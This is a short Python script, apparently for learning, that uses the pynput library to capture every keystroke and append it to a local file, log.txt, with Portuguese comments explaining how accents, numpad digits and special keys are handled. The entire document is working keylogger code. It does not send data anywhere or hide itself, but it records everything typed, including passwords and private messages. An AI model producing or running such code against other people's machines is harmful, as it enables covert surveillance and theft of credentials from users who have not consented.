from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # Se for uma tecla "normal" (letra, numero, smbolo)        
        with open("log.txt", "a", encoding="utf-8") as f:
            if key.char is not None:
                f.write(key.char)
            else:
                # Se for None (como um acento isolado), força ir para o tratamento especial
                raise AttributeError

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            # 1. CORREÇÃO PARA O TECLADO NUMÉRICO (NUMPAD)
            # Verifica se a tecla especial possui um código virtual numérico (vk de 96 a 105 são os números de 0 a 9)
            if hasattr(key, 'vk') and 96 <= key.vk <= 105:
                numero = str(key.vk - 96) # Converte o código interno no número real (0-9)
                f.write(numero)

            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("BACKSPACE")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()